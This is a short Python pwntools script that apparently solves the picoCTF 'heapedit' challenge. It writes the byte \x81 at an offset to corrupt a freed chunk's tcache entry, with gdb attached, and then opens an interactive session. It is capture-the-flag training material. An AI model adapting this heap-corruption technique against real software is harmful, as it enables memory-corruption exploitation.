#!/usr/bin/env python3

from pwn import *

"""
freed malloc is stored in the tcache
"""

def conn():
    # r = remote("mercury.picoctf.net", 34499)
    r = process("./heapedit")
    gdb.attach(r)

    return r


def main():
    r = conn()
    addr = 1000
    val = "\x81"

    r.recvuntil("Address:")
    r.sendline(str(addr).encode())
    r.recvuntil("Value:")
    r.sendline(val.encode())

    r.interactive()
    r.close()


if __name__ == "__main__":
    main()
